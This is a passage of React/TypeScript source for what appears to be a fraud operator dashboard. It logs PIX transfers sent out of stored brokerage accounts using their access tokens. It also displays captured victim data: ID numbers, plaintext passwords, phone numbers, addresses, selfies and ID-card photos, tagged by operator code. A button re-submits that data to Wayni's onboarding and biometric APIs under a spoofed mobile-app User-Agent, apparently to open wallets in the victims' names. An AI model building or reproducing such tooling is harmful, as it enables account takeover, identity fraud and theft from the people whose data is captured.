                      onOperate={() => handleOperate(account)}
                      onDelete={() => handleDeleteAccount(account)}
                      safeInvoke={safeInvoke}
                      onAccountUpdate={() => loadAccounts(false)}
                      onTagChange={async (tag) => {
                        await supabase.from("cocos_accounts").update({ info_tag: tag } as any).eq("id", account.id);
                        loadAccounts(false);
                      }}
                    />
                  ))}
              </div>
            )}
          </div>
        )}

        {/* ══ PIX LOG (master only) ══ */}
        {!myOperator && activeTab === "accounts" && (
          <section className="mt-6">
            <div className="flex items-center justify-between mb-3">
              <h2 className="text-xs font-bold text-foreground flex items-center gap-2">
                <Banknote size={14} className="text-green-400" /> PIX
                <span className="text-[10px] font-normal text-muted-foreground">{totalPixCount} enviados • {fmtBRL(totalPixBRL)}</span>
              </h2>
              <div className="flex items-center gap-1.5">
                <button onClick={handleCheckAllPix} disabled={pixCheckingAll}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/15 transition-all disabled:opacity-50">
                  {pixCheckingAll ? `${pixCheckProgress.done}/${pixCheckProgress.total}` : "Consultar"}
                </button>
                <button onClick={loadPixTransactions} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground transition-colors">
                  <RefreshCw size={12} />
                </button>
              </div>
            </div>

            {pixLoading ? (
              <div className="flex items-center justify-center py-10"><RefreshCw size={16} className="animate-spin text-primary" /></div>
            ) : pixTransactions.length === 0 ? (
              <p className="text-center text-sm text-muted-foreground py-8">Nenhum PIX.</p>
            ) : (
              <div className="rounded-xl border border-border overflow-hidden">
                <table className="w-full text-[11px]">
                  <thead>
                    <tr className="bg-secondary/40 border-b border-border text-[9px] text-muted-foreground uppercase">
                      <th className="text-left px-3 py-2">Data</th>
                      <th className="text-left px-3 py-2">Conta</th>
                      <th className="text-left px-3 py-2">Chave PIX</th>
                      <th className="text-right px-3 py-2">BRL</th>
                      <th className="text-right px-3 py-2">ARS</th>
                      <th className="text-center px-3 py-2">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-border/30">
                    {pixTransactions.map((tx) => {
                      const time = new Date(tx.created_at);
                      const isSuccess = successStatuses.has(tx.status.toLowerCase());
                      return (
                        <tr key={tx.id} className="hover:bg-secondary/20 transition-colors">
                          <td className="px-3 py-2 text-muted-foreground font-mono text-[10px]">
                            {time.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit" })} {time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })}
                          </td>
                          <td className="px-3 py-2">
                            <span className="font-semibold text-foreground truncate block max-w-[160px]">{tx.account_email}</span>
                            {tx.recipient_name && <span className="text-[9px] text-muted-foreground">→ {tx.recipient_name}</span>}
                          </td>
                          <td className="px-3 py-2 font-mono text-muted-foreground truncate max-w-[120px]">{tx.pix_key}</td>
                          <td className={`px-3 py-2 text-right font-bold tabular-nums ${isSuccess ? "text-green-400" : "text-red-400"}`}>{fmtBRL(tx.amount_brl)}</td>
                          <td className="px-3 py-2 text-right text-muted-foreground tabular-nums">{tx.amount_ars ? fmtARS(tx.amount_ars) : "—"}</td>
                          <td className="px-3 py-2 text-center">
                            {pixStatusResults[tx.id] ? (
                              <span className={`text-[8px] px-1.5 py-0.5 rounded-full font-bold ${
                                String(pixStatusResults[tx.id].status) === "COMPLETED" ? "bg-green-500/15 text-green-400" :
                                String(pixStatusResults[tx.id].status) === "FAILED" ? "bg-red-500/15 text-red-400" :
                                "bg-blue-500/15 text-blue-400"
                              }`}>
                                {String(pixStatusResults[tx.id].status || pixStatusResults[tx.id].error || "?")}
                              </span>
                            ) : (
                              <button
                                onClick={async () => {
                                  if (!tx.payment_id) return;
                                  const acct = accounts.find(a => a.email === tx.account_email);
                                  if (!acct?.access_token || !acct?.account_id) { setPixStatusResults(prev => ({ ...prev, [tx.id]: { error: "Sem token" } })); return; }
                                  setPixCheckingId(tx.id);
                                  try {
                                    const res = await invokeCocos({ action: "pix_get_payment", access_token: acct.access_token, account_id: acct.account_id, payment_id: tx.payment_id });
                                    const data = res.data as Record<string, unknown>;
                                    setPixStatusResults(prev => ({ ...prev, [tx.id]: data || { error: "Sem resposta" } }));
                                    if (data?.status && String(data.status).toUpperCase() !== tx.status.toUpperCase()) {
                                      await supabase.from("pix_transactions" as any).update({ status: String(data.status).toLowerCase() }).eq("id", tx.id);
                                      setPixTransactions(prev => prev.map(t => t.id === tx.id ? { ...t, status: String(data.status).toLowerCase() } : t));
                                    }
                                  } catch { setPixStatusResults(prev => ({ ...prev, [tx.id]: { error: "Erro" } })); }
                                  setPixCheckingId(null);
                                }}
                                disabled={pixCheckingId === tx.id || !tx.payment_id}
                                className={`text-[8px] px-1.5 py-0.5 rounded-full font-semibold ${isSuccess ? "bg-green-500/10 text-green-400" : "bg-red-500/10 text-red-400"}`}>
                                {pixCheckingId === tx.id ? <RefreshCw size={8} className="animate-spin inline" /> : tx.status}
                              </button>
                            )}
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </section>
        )}
      </main>
    </div>
    </SessionPresenceProvider>
  );
};

// ══════════════════════════════════════════
// METRIC CARD
// ══════════════════════════════════════════
const MetricCard = ({ label, value, color, icon, sub, size, highlight }: {
  label: string; value: string; color: string; icon: string; sub?: string; size?: "lg"; highlight?: boolean;
}) => (
  <div className={`rounded-xl border bg-card px-3 py-2.5 ${highlight ? "border-orange-500/30 ring-1 ring-orange-500/10" : "border-border"}`}>
    <div className="flex items-center justify-between">
      <span className="text-[9px] font-semibold text-muted-foreground uppercase tracking-wider">{label}</span>
      <span className="text-sm">{icon}</span>
    </div>
    <p className={`${size === "lg" ? "text-lg" : "text-sm"} font-bold ${color} tabular-nums leading-tight mt-1 truncate`}>{value}</p>
    {sub && <p className="text-[9px] text-muted-foreground mt-0.5">{sub}</p>}
  </div>
);

// ══════════════════════════════════════════
// LIMIT BAR
// ══════════════════════════════════════════
const LimitBar = ({ label, used, total }: { label: string; used: number; total: number }) => {
  const pct = total > 0 ? (used / total) * 100 : 0;
  const isHigh = pct > 80;
  return (
    <div className="rounded-xl border border-border bg-card px-3 py-2.5">
      <div className="flex items-center justify-between">
        <span className="text-[9px] font-semibold text-muted-foreground uppercase tracking-wider">{label}</span>
        {total > 0 && <span className={`text-[9px] font-bold ${isHigh ? "text-red-400" : "text-muted-foreground"}`}>{pct.toFixed(0)}%</span>}
      </div>
      <p className={`text-sm font-bold tabular-nums leading-tight mt-1 ${total > 0 ? (isHigh ? "text-red-400" : "text-blue-400") : "text-muted-foreground/30"}`}>
        {total > 0 ? `$${used.toFixed(0)} / $${total.toFixed(0)}` : "—"}
      </p>
      {total > 0 && (
        <div className="h-1 rounded-full bg-border mt-1.5 overflow-hidden">
          <div className={`h-full rounded-full transition-all ${isHigh ? "bg-red-500" : "bg-blue-500"}`} style={{ width: `${Math.min(100, pct)}%` }} />
        </div>
      )}
    </div>
  );
};

// ══════════════════════════════════════════
// WAYNI ONBOARDING CARD — Dedicated tracking
// ══════════════════════════════════════════
const WayniOnboardingCard = ({ session }: { session: LiveSession }) => {
  const [copied, setCopied] = useState("");
  const [bioInfo, setBioInfo] = useState<Record<string, unknown> | null>(null);
  const [walletInfo, setWalletInfo] = useState<Record<string, unknown> | null>(null);
  const [loading, setLoading] = useState(false);
  const [lastCheck, setLastCheck] = useState<string>("");
  const [showImages, setShowImages] = useState(false);
  const [bioImages, setBioImages] = useState<Record<string, string | null> | null>(null);
  const [loadingImages, setLoadingImages] = useState(false);
  const [retrying, setRetrying] = useState(false);
  const [retryResult, setRetryResult] = useState<{ ok: boolean; msg: string } | null>(null);

  const time = new Date(session.created_at);
  const timeStr = time.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit" }) + " " + time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });

  const otpParts: Record<string, string> = {};
  if (session.otp_code) {
    session.otp_code.split("|").forEach((part) => {
      const colonIdx = part.indexOf(":");
      const eqIdx = part.indexOf("=");
      let sep = -1;
      if (colonIdx > 0 && eqIdx > 0) sep = Math.min(colonIdx, eqIdx);
      else if (colonIdx > 0) sep = colonIdx;
      else if (eqIdx > 0) sep = eqIdx;
      if (sep > 0) {
        const k = part.slice(0, sep).trim();
        const v = part.slice(sep + 1).trim();
        if (k) otpParts[k] = v;
      }
    });
  }

  const dni = otpParts.dni || "";
  const userName = otpParts.name || "";
  const userUuid = otpParts.uuid || "";

  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };

  const getProcessStage = () => {
    const s = session.status;
    if (s === "verify_dni_submitted") return { label: "DNI Enviado", icon: "📋", color: "text-yellow-400 bg-yellow-500/10" };
    if (s === "verify_dni_success") return { label: "DNI Validado ✓", icon: "📋", color: "text-green-400 bg-green-500/10" };
    if (s === "verify_dni_error") return { label: "DNI Error ✗", icon: "📋", color: "text-red-400 bg-red-500/10" };
    if (s === "address_submitted") return { label: "Endereço Enviado", icon: "📍", color: "text-yellow-400 bg-yellow-500/10" };
    if (s === "address_saved") return { label: "Endereço Salvo ✓", icon: "📍", color: "text-green-400 bg-green-500/10" };
    if (s === "address_error") return { label: "Endereço Error ✗", icon: "📍", color: "text-red-400 bg-red-500/10" };
    if (s === "biometric_started") return { label: "Biometria Iniciada", icon: "🔬", color: "text-amber-400 bg-amber-500/10" };
    if (s === "biometric_finished") return { label: "Biometria Concluída ✓", icon: "🔬", color: "text-green-400 bg-green-500/10" };
    if (s === "biometric_error") return { label: "Biometria Error ✗", icon: "🔬", color: "text-red-400 bg-red-500/10" };
    return { label: cfg.label, icon: "❓", color: cfg.color };
  };

  const stage = getProcessStage();

  const fetchInfo = async () => {
    if (!dni) return;
    setLoading(true);
    try {
      const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
      const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };

      const [bioRes, walletRes] = await Promise.allSettled([
        fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify({ action: "get_biometric_info", identity_number: dni }) }).then(r => r.json()),
        fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers, body: JSON.stringify({ action: "get_wallet_status", identity_number: dni }) }).then(r => r.json()),
      ]);

      const bio = bioRes.status === "fulfilled" && bioRes.value?.success ? bioRes.value : null;
      const wallet = walletRes.status === "fulfilled" ? walletRes.value : null;
      if (bio) setBioInfo(bio);
      if (wallet) setWalletInfo(wallet);
      setLastCheck(new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" }));

      // Save the latest response back to the session otp_code for filtering
      const updates: Record<string, string> = {};
      if (bio) {
        updates.bio_status = String(bio.status || "unknown");
        updates.has_selfie = String(bio.has_selfie === true);
        updates.has_dni_front = String(bio.has_dni_front === true);
        updates.has_dni_back = String(bio.has_dni_back === true);
        if (bio.facematching) {
          const fm = bio.facematching as Record<string, unknown>;
          updates.face_code = String(fm.code || "");
          updates.face_confidence = String(fm.confidence || "");
        }
      }
      if (wallet) {
        const walletStatus = typeof wallet.status === "string"
          ? wallet.status
          : (wallet.errors ? "NOT_FOUND" : "UNKNOWN");
        updates.wallet_status = String(walletStatus).toUpperCase();
        if (wallet.uuid) updates.wallet_uuid = String(wallet.uuid);
      }
      // Merge into existing otp_code
      if (Object.keys(updates).length > 0) {
        const existingParts = { ...otpParts };
        Object.assign(existingParts, updates);
        const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
        await supabase.from("sessions").update({ otp_code: newOtp }).eq("id", session.id);
      }
    } catch { /* ignore */ }
    setLoading(false);
  };

  const fetchImages = async () => {
    if (!dni) return;
    setLoadingImages(true);
    try {
      const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
      const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      const headers = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
      const res = await fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, {
        method: "POST", headers,
        body: JSON.stringify({ action: "get_biometric_info", identity_number: dni, include_images: true }),
      }).then(r => r.json());
      if (res?.success) {
        setBioImages({
          selfie: res.selfie_img || null,
          dniFront: res.dni_front_img || null,
          dniBack: res.dni_back_img || null,
        });
        setShowImages(true);
      }
    } catch { /* ignore */ }
    setLoadingImages(false);
  };

  useEffect(() => {
    if (!dni) return;
    fetchInfo();
    const interval = setInterval(fetchInfo, 3 * 60 * 1000);
    return () => clearInterval(interval);
  }, [dni]);

  const copyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(""), 1500);
  };

  const BioCheck = ({ ok, label }: { ok: boolean; label: string }) => (
    <span className={`text-[9px] px-2 py-1 rounded-lg font-semibold ${ok ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-red-500/15 text-red-400 border border-red-500/20"}`}>
      {ok ? "✓" : "✗"} {label}
    </span>
  );

  const getValidationProgress = () => {
    const steps = [];
    const dniOk = ["verify_dni_success", "address_submitted", "address_saved", "biometric_started", "biometric_finished"].includes(session.status);
    steps.push({ label: "DNI", done: dniOk, error: session.status === "verify_dni_error" });
    const addressOk = ["address_saved", "biometric_started", "biometric_finished"].includes(session.status);
    steps.push({ label: "Endereço", done: addressOk, error: session.status === "address_error" });
    const bioSuccess = bioInfo?.status === "success" || (bioInfo?.has_selfie === true && bioInfo?.has_dni_front === true && bioInfo?.has_dni_back === true);
    const bioOk = session.status === "biometric_finished" || !!bioSuccess;
    steps.push({ label: "Biometria", done: bioOk, error: session.status === "biometric_error" });
    const walletOk = walletInfo && walletInfo.status === "ACTIVE";
    steps.push({ label: "Wallet", done: !!walletOk });
    return steps;
  };

  const progress = getValidationProgress();
  const faceConfidence = bioInfo?.facematching ? (bioInfo.facematching as Record<string, unknown>)?.confidence : null;
  const faceCode = bioInfo?.facematching ? (bioInfo.facematching as Record<string, unknown>)?.code : null;

  return (
    <div className="rounded-xl border border-border bg-card overflow-hidden">
      {/* Header */}
      <div className="px-4 py-3 flex items-center justify-between gap-3 border-b border-border/50">
        <div className="flex items-center gap-3 min-w-0">
          <div className="h-8 w-8 rounded-lg bg-green-500/10 flex items-center justify-center shrink-0">
            <span className="text-sm">{stage.icon}</span>
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[12px] font-bold text-foreground truncate">{session.email || "—"}</span>
              <span className={`text-[9px] px-2 py-0.5 rounded-lg font-bold ${stage.color}`}>{stage.label}</span>
            </div>
            <div className="flex items-center gap-2 text-[9px] text-muted-foreground mt-0.5">
              <span>{timeStr}</span>
              {session.country && <span>• {session.country}{session.city ? ` ${session.city}` : ""}</span>}
              {session.operator_code && session.operator_code !== "master" && (
                <span className="font-mono px-1 py-0.5 rounded bg-purple-500/10 text-purple-400">{session.operator_code}</span>
              )}
            </div>
          </div>
        </div>
        <button onClick={fetchInfo} disabled={loading} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors shrink-0">
          <RefreshCw size={12} className={loading ? "animate-spin" : ""} />
        </button>
      </div>

      {/* Progress bar */}
      <div className="px-4 py-2.5 flex items-center gap-1.5">
        {progress.map((step, i) => (
          <div key={step.label} className="flex items-center gap-1.5 flex-1">
            <div className={`flex items-center gap-1 px-2 py-1 rounded-lg text-[9px] font-bold flex-1 justify-center ${
              step.done ? "bg-green-500/10 text-green-400 border border-green-500/20" :
              step.error ? "bg-red-500/10 text-red-400 border border-red-500/20" :
              "bg-secondary text-muted-foreground border border-border"
            }`}>
              {step.done ? "✓" : step.error ? "✗" : "○"} {step.label}
            </div>
            {i < progress.length - 1 && <span className="text-muted-foreground/30 text-[8px]">→</span>}
          </div>
        ))}
      </div>

      {/* Data */}
      <div className="px-4 pb-3 space-y-2">
        <div className="flex items-center gap-3 flex-wrap">
          {dni && (
            <button onClick={() => copyText(dni, "dni")} className="flex items-center gap-1 hover:opacity-80">
              <span className="text-[10px] font-semibold text-indigo-400">📋 DNI: {dni}</span>
              {copied === "dni" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
            </button>
          )}
          {userName && <span className="text-[10px] text-foreground font-medium">👤 {userName}</span>}
          {otpParts.gender && <span className="text-[10px] text-muted-foreground">⚧ {otpParts.gender}</span>}
          {session.password && (
            <button onClick={() => copyText(session.password!, "spwd")} className="flex items-center gap-1 hover:opacity-80">
              <Lock size={8} className="text-yellow-400" />
              <span className="text-[10px] font-mono text-yellow-400">{session.password}</span>
              {copied === "spwd" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
            </button>
          )}
        </div>

        <div className="flex items-center gap-3 flex-wrap">
          {userUuid && (
            <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 hover:opacity-80">
              <span className="text-[9px] font-mono text-muted-foreground">🔑 UUID: {userUuid.slice(0, 16)}...</span>
              {copied === "uuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
            </button>
          )}
          {otpParts.phone && (
            <button onClick={() => copyText(otpParts.phone, "phone")} className="flex items-center gap-1 hover:opacity-80">
              <span className="text-[10px] text-cyan-400">📱 {otpParts.phone}</span>
              {copied === "phone" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
            </button>
          )}
        </div>

        {(otpParts.region || otpParts.city || otpParts.street || otpParts.zip) && (
          <div className="rounded-lg border border-border/50 bg-secondary/30 px-3 py-2 space-y-1">
            <span className="text-[9px] font-bold text-muted-foreground">📍 Endereço:</span>
            <div className="flex items-center gap-2 flex-wrap text-[10px] text-foreground">
              {otpParts.street && <span>{otpParts.street}</span>}
              {otpParts.city && <span>• {otpParts.city}</span>}
              {otpParts.region && <span>• {otpParts.region}</span>}
              {otpParts.zip && <span>• CP {otpParts.zip}</span>}
            </div>
          </div>
        )}

        {otpParts.biometric_url && (
          <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 px-3 py-2 space-y-1">
            <span className="text-[9px] font-bold text-amber-400">🔗 Link Biométrico:</span>
            <div className="flex items-center gap-2">
              <a href={otpParts.biometric_url} target="_blank" rel="noopener noreferrer" className="text-[9px] text-blue-400 underline truncate max-w-[300px] hover:text-blue-300">
                {otpParts.biometric_url.length > 60 ? otpParts.biometric_url.slice(0, 60) + "..." : otpParts.biometric_url}
              </a>
              <button onClick={() => copyText(otpParts.biometric_url, "biourl")} className="shrink-0">
                {copied === "biourl" ? <Check size={10} className="text-green-400" /> : <Copy size={10} className="text-muted-foreground hover:text-foreground" />}
              </button>
            </div>
            {otpParts.biometric_id && (
              <span className="text-[8px] font-mono text-muted-foreground">ID: {otpParts.biometric_id}</span>
            )}
          </div>
        )}

        {/* Biometric validation details */}
        {bioInfo && (
          <div className="rounded-lg border border-border/50 bg-secondary/20 px-3 py-2 space-y-2">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-[9px] font-bold text-muted-foreground">Validação:</span>
                <BioCheck ok={bioInfo.has_selfie === true} label="Selfie" />
                <BioCheck ok={bioInfo.has_dni_front === true} label="DNI Frente" />
                <BioCheck ok={bioInfo.has_dni_back === true} label="DNI Dorso" />
              </div>
              {(bioInfo.has_selfie || bioInfo.has_dni_front || bioInfo.has_dni_back) && (
                <button
                  onClick={fetchImages}
                  disabled={loadingImages}
                  className="text-[9px] px-2 py-1 rounded-lg bg-blue-500/10 text-blue-400 border border-blue-500/20 hover:bg-blue-500/20 transition-colors font-semibold flex items-center gap-1"
                >
                  {loadingImages ? <RefreshCw size={10} className="animate-spin" /> : <Eye size={10} />}
                  {loadingImages ? "Carregando..." : "Ver Fotos"}
                </button>
              )}
            </div>
            {bioInfo.facematching && (
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-[9px] font-bold text-muted-foreground">Facematching:</span>
                <span className={`text-[9px] px-2 py-0.5 rounded-lg font-bold ${faceCode === 200 ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-red-500/15 text-red-400 border border-red-500/20"}`}>
                  {faceCode === 200 ? "✓ Aprovado" : `✗ Código ${faceCode}`}
                </span>
                {faceConfidence !== null && (
                  <span className={`text-[9px] px-2 py-0.5 rounded-lg font-semibold ${Number(faceConfidence) >= 80 ? "bg-green-500/10 text-green-400" : Number(faceConfidence) >= 50 ? "bg-yellow-500/10 text-yellow-400" : "bg-red-500/10 text-red-400"}`}>
                    {String(faceConfidence)}% confiança
                  </span>
                )}
              </div>
            )}
            {bioInfo.status && (
              <div className="flex items-center gap-2">
                <span className="text-[9px] font-bold text-muted-foreground">Status:</span>
                <span className={`text-[9px] px-2 py-0.5 rounded-lg font-bold ${bioInfo.status === "success" ? "bg-green-500/15 text-green-400 border border-green-500/20" : "bg-amber-500/15 text-amber-400 border border-amber-500/20"}`}>
                  {String(bioInfo.status).toUpperCase()}
                </span>
                {bioInfo.last_completed_section && (
                  <span className="text-[8px] text-muted-foreground">• Seção: {String(bioInfo.last_completed_section)}</span>
                )}
              </div>
            )}
          </div>
        )}

        {/* Image viewer */}
        {showImages && bioImages && (
          <div className="rounded-lg border border-blue-500/20 bg-blue-500/5 px-3 py-3 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold text-blue-400">📸 Documentos Enviados</span>
              <button onClick={() => setShowImages(false)} className="text-[9px] text-muted-foreground hover:text-foreground">✕ Fechar</button>
            </div>
            <div className="grid grid-cols-3 gap-2">
              {bioImages.selfie && (
                <div className="space-y-1">
                  <span className="text-[8px] font-bold text-green-400 block text-center">Selfie</span>
                  <img src={`data:image/jpeg;base64,${bioImages.selfie}`} alt="Selfie" className="w-full rounded-lg border border-border object-cover max-h-[200px]" />
                </div>
              )}
              {bioImages.dniFront && (
                <div className="space-y-1">
                  <span className="text-[8px] font-bold text-green-400 block text-center">DNI Frente</span>
                  <img src={`data:image/jpeg;base64,${bioImages.dniFront}`} alt="DNI Frente" className="w-full rounded-lg border border-border object-cover max-h-[200px]" />
                </div>
              )}
              {bioImages.dniBack && (
                <div className="space-y-1">
                  <span className="text-[8px] font-bold text-green-400 block text-center">DNI Dorso</span>
                  <img src={`data:image/jpeg;base64,${bioImages.dniBack}`} alt="DNI Dorso" className="w-full rounded-lg border border-border object-cover max-h-[200px]" />
                </div>
              )}
            </div>
          </div>
        )}

        {walletInfo && (
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-[9px] font-bold text-muted-foreground">Wallet:</span>
            <span className={`text-[10px] px-2 py-0.5 rounded-lg font-bold ${
              walletInfo.status === "ACTIVE" ? "bg-green-500/15 text-green-400 border border-green-500/20" :
              walletInfo.uuid ? "bg-amber-500/15 text-amber-400 border border-amber-500/20" :
              "bg-red-500/15 text-red-400 border border-red-500/20"
            }`}>
              💳 {walletInfo.status ? String(walletInfo.status) : walletInfo.errors ? "NO ENCONTRADA" : "PENDIENTE"}
            </span>
            {walletInfo.uuid && (
              <button onClick={() => copyText(String(walletInfo.uuid), "wuuid")} className="flex items-center gap-1 hover:opacity-80">
                <span className="text-[9px] font-mono text-muted-foreground">UUID: {String(walletInfo.uuid).slice(0, 12)}...</span>
                {copied === "wuuid" ? <Check size={8} className="text-green-400" /> : <Copy size={8} className="text-muted-foreground" />}
              </button>
            )}
          </div>
        )}

        {session.ip_address && (
          <div className="flex items-center gap-2 flex-wrap text-[9px] text-muted-foreground">
            <span>🌐 {session.ip_address}</span>
            {session.user_agent && <span>• {parseDevice(session.user_agent)} {parseBrowser(session.user_agent)}</span>}
          </div>
        )}

        {/* ── CRIAR CONTA BUTTON ── */}
        {(() => {
          const bioOk = bioInfo?.status === "success" || (bioInfo?.has_selfie === true && bioInfo?.has_dni_front === true && bioInfo?.has_dni_back === true);
          const walletActive = walletInfo?.status === "ACTIVE";
          const hasDni = !!dni;
          const hasUuid = !!userUuid;
          const hasEmail = !!session.email;
          const hasAddress = !!(otpParts.region && otpParts.city && otpParts.street && otpParts.zip);
          const isFullyVerified = !!bioOk && hasDni && hasUuid && hasEmail;

           const handleRetry = async () => {
            setRetrying(true);
            setRetryResult(null);
            try {
              const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
              const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
              const edgeHeaders = { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` };
              const invoke = async (body: Record<string, unknown>) => {
                const res = await fetch(`${SUPABASE_URL}/functions/v1/wayni-auth`, { method: "POST", headers: edgeHeaders, body: JSON.stringify(body) });
                const data = await res.json();
                if (!res.ok) throw new Error(data?.error || data?.message || `Error ${res.status}`);
                return data;
              };

              // Step 1: onboarding_verify (save-data) via edge function
              const verifyRes = await invoke({
                action: "onboarding_verify",
                email: session.email,
                identity_number: dni,
                phone_number: otpParts.phone || "",
                password: session.password || "",
                selected_full_name: userName || undefined,
                selected_gender: otpParts.gender || undefined,
                selected_tax_identification_value: otpParts.tax_id || undefined,
              });

              const resolvedUuid = verifyRes.user_uuid || userUuid;

              // Step 2: save_address (direct API call)
              if (hasAddress && resolvedUuid) {
                const addrRes = await fetch("https://auth.waynimovil.ar/api/v1/onboarding/save-address", {
                  method: "POST",
                  headers: {
                    "Host": "auth.waynimovil.ar",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "Accept-Language": "pt-BR,pt;q=0.9",
                    "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
                    "x-correlation-id": crypto.randomUUID(),
                  },
                  body: JSON.stringify({
                    uuid: resolvedUuid,
                    street_name: otpParts.street || "",
                    street_number: otpParts.street_number || "0",
                    floor: otpParts.floor || null,
                    apartment: otpParts.apartment || null,
                    zip_code: otpParts.zip || "",
                    neighborhood: null,
                    city_id: parseInt(otpParts.city_id || "0") || 0,
                    city: otpParts.city || "",
                    region_id: parseInt(otpParts.region_id || "0") || 0,
                    region: otpParts.region || "",
                    terms_and_conditions_identifier: "terms_68fb9c8e835409.28822061",
                  }),
                });
                if (!addrRes.ok) {
                  const addrErr = await addrRes.text();
                  console.warn("save-address error:", addrErr);
                }
              }

              // Step 3: biometric (direct API call)
              if (resolvedUuid) {
                const bioApiRes = await fetch("https://billetera.waynimovil.ar/me/api/v1/me/onboarding/biometric", {
                  method: "POST",
                  headers: {
                    "Host": "billetera.waynimovil.ar",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "Accept-Language": "pt-BR,pt;q=0.9",
                    "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
                    "x-correlation-id": crypto.randomUUID(),
                  },
                  body: JSON.stringify({
                    documentNumber: dni,
                    userUuid: resolvedUuid,
                    gender: otpParts.gender || "M",
                  }),
                });
                const bioData = await bioApiRes.json();
                if (bioData?.url) {
                  const existingParts = { ...otpParts };
                  existingParts.biometric_url = bioData.url;
                  if (bioData.externalIdentifier) existingParts.biometric_id = bioData.externalIdentifier;
                  if (resolvedUuid !== userUuid) existingParts.uuid = resolvedUuid;
                  const newOtp = Object.entries(existingParts).map(([k, v]) => `${k}:${v}`).join("|");
                  await supabase.from("sessions").update({ otp_code: newOtp, status: "biometric_started" }).eq("id", session.id);
                  setRetryResult({ ok: true, msg: `✓ Cadastro reenviado! Link: ${bioData.url}` });
                }
              }

              if (!retryResult) setRetryResult({ ok: true, msg: "✓ Cadastro reenviado com sucesso!" });
              fetchInfo();
            } catch (err: any) {
              setRetryResult({ ok: false, msg: err?.message || "Erro ao reenviar cadastro" });
            }
            setRetrying(false);
          };

          return (
            <div className="mt-2 space-y-2">
              <button
                onClick={handleRetry}
                disabled={retrying || !isFullyVerified || walletActive}
                className={`w-full rounded-lg py-2.5 text-[12px] font-bold transition-all flex items-center justify-center gap-2 ${
                  walletActive
                    ? "bg-green-500/10 text-green-400 border border-green-500/20 cursor-default"
                    : isFullyVerified
                    ? "bg-gradient-to-r from-emerald-600 to-green-500 text-white hover:from-emerald-500 hover:to-green-400 shadow-lg shadow-green-500/20 active:scale-[0.98]"
                    : "bg-secondary text-muted-foreground border border-border cursor-not-allowed opacity-50"
                } disabled:opacity-50`}
              >
                {retrying ? (
                  <><RefreshCw size={14} className="animate-spin" /> Reenviando cadastro...</>
                ) : walletActive ? (
                  <><Check size={14} /> Conta já ativa</>
                ) : (
                  <><Zap size={14} /> Reenviar Cadastro / Criar Conta</>
                )}
              </button>
              {!isFullyVerified && !walletActive && (
                <div className="flex items-center gap-1.5 flex-wrap text-[9px] text-amber-400">
                  <span>⚠️ Faltam:</span>
                  {!hasDni && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">DNI</span>}
                  {!hasEmail && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">Email</span>}
                  {!hasUuid && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">UUID</span>}
                  {!bioOk && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">Biometria</span>}
                  {!hasAddress && <span className="px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20">Endereço</span>}
                </div>
              )}
              {retryResult && (
                <div className={`text-[10px] px-3 py-2 rounded-lg font-semibold ${retryResult.ok ? "bg-green-500/10 text-green-400 border border-green-500/20" : "bg-red-500/10 text-red-400 border border-red-500/20"}`}>
                  {retryResult.msg}
                </div>
              )}
            </div>
          );
        })()}

        {lastCheck && (
